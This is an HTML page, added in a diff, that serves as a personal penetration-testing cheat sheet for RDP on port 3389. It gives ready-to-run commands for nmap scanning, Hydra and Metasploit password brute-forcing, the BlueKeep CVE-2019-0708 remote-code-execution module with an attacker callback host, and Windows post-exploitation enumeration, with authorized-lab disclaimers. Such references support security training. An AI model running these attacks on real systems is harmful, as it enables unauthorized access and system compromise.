@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+
+<html dir="ltr" lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<title>RDP — Pentest Cheat Sheet</title>
+<style>
+:root{
+  --bg:#0b0b0b;
+  --panel:#141414;
+  --panel-2:#1a1a1a;
+  --border:#2b2b2b;
+  --gold:#d4af37;
+  --gold-dim:#8a712a;
+  --yellow:#e8c547;
+  --text:#e9e6da;
+  --text-dim:#a19c8c;
+  --mono:#f2e6b8;
+  --green:#7fae4a;
+  --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Tahoma","Segoe UI",sans-serif;
+  margin:0;
+  padding:0 0 4rem;
+  line-height:1.7;
+}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:2rem;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+</style>
+<style>html[dir="ltr"] body{direction:ltr;text-align:left}html[dir="ltr"] .stage{border-right:1px solid var(--border);border-left:3px solid var(--gold)}html[dir="ltr"] .toc,html[dir="ltr"] .portnote,html[dir="ltr"] .note,html[dir="ltr"] .tip,html[dir="ltr"] .danger,html[dir="ltr"] .result{text-align:left}</style></head>
+<body>
+<div class="wrap">
+<div class="hero">
+<span class="tag">PORT 3389 / TCP — REMOTE DESKTOP PROTOCOL</span>
+<h1>RDP — Practical Assessment Reference</h1>
+<p>Quick service reference for authorized labs: discovery, enumeration, validation, access assessment, and documentation for RDP.</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div>
+<div class="portnote"><b>Service note: </b>Ports, versions, and deployment details can vary by configuration. Confirm the actual service fingerprint instead of relying only on a default port.</div>
+<div class="toc">
+<span class="ttl">CONTENTS</span>
+<ol>
+<li><a href="#s1">Reconnaissance</a></li>
+<li><a href="#s2">Port Scanning</a></li>
+<li><a href="#s3">Enumeration</a></li>
+<li><a href="#s4">Credential Testing</a></li>
+<li><a href="#s5">Exploitation</a></li>
+<li><a href="#s6">Post-Exploitation</a></li>
+</ol>
+</div>
+<div class="stage" id="s1">
+<h2>1. Reconnaissance</h2>
+<p class="desc">Confirm the target, network path, and basic reachability before deeper testing.</p>
+<div class="step">
+<div class="step-title">Review the local network interfaces <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ip a
+ip route</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Check basic target reachability <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ping -c 4 [TARGET]</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div>
+</div>
+<div class="stage" id="s2">
+<h2>2. Port Scanning</h2>
+<p class="desc">Identify exposed ports, service versions, and relevant protocols before enumeration.</p>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -sV -p3389 [TARGET]</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p- --min-rate=1000 -T4 [TARGET]</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -sV -sC -p[PORT] [TARGET]</div>
+</div>
+<div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div>
+</div>
+<div class="stage" id="s3">
+<h2>3. Enumeration</h2>
+<p class="desc">Collect service metadata and enumerate only the information needed for the authorized lab.</p>
+<div class="step">
+<div class="step-title">Run the documented check: use auxiliary/scanner/rdp/rdp_scanner <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS [TARGET]
+set RPORT [PORT]
+run</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p[PORT] --script=rdp-enum-encryption [TARGET]</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the required Nmap service check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p[PORT] --script=rdp-ntlm-info [TARGET]</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div>
+</div>
+<div class="stage" id="s4">
+<h2>4. Credential Testing</h2>
+<p class="desc">Assess authentication with known or explicitly authorized credentials only.</p>
+<div class="step">
+<div class="step-title">Run the authorized credential check <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">hydra -L [USERLIST] -P [WORDLIST] rdp://[TARGET] -s [PORT]</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the documented check: use auxiliary/scanner/rdp/rdp_login <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/rdp/rdp_login
+set RHOSTS [TARGET]
+set RPORT [PORT]
+set USER_FILE [USERLIST]
+set PASS_FILE [WORDLIST]
+run</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the documented check: xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT] <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+</div>
+<div class="danger">Warning: use this step only in an authorized lab or explicitly permitted assessment. Avoid disruptive changes unless they are part of the approved scope.</div>
+</div>
+<div class="stage" id="s5">
+<h2>5. Exploitation</h2><div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div>
+<p class="desc">Match any test to the confirmed service, version, prerequisites, and approved scope before proceeding.</p>
+<div class="step">
+<div class="step-title">Run the documented check: use auxiliary/scanner/rdp/cve_2019_0708_bluekeep <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
+set RHOSTS [TARGET]
+set RPORT [PORT]
+run</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the documented check: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS [TARGET]
+set RPORT [PORT]
+show targets
+set TARGET [MATCHED_TARGET]
+set LHOST [ATTACKER_IP]
+run</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="danger">Warning: use this step only in an authorized lab or explicitly permitted assessment. Avoid disruptive changes unless they are part of the approved scope.</div>
+</div>
+<div class="stage" id="s6">
+<h2>6. Post-Exploitation</h2>
+<p class="desc">Match any test to the confirmed service, version, prerequisites, and approved scope before proceeding.</p>
+<div class="step">
+<div class="step-title">Run the documented check: whoami <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">whoami
+whoami /groups</div>
+<div class="result">REFERENCE — Treat the step as successful only when the expected service response or evidence is actually returned and can be verified.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the documented check: hostname <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">hostname
+systeminfo
+ipconfig /all</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="step">
+<div class="step-title">Run the documented check: whoami /priv <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">whoami /priv</div>
+<div class="note">Review the returned output, verify it against the current service, and record only the evidence needed for the authorized lab.</div>
+</div>
+<div class="tip">Tip: verify the service, version, and prerequisites before moving to the next step.</div>
+</div>
+<footer>
+<div class="author">Prepared by Abdullah Nasser Almsan</div>
+<div class="disclaimer">Personal technical reference for learning and authorized penetration-testing labs only. The author is not responsible for misuse or unauthorized activity outside the approved scope.</div>
+</footer>
+</div>
+</body>
+</html>
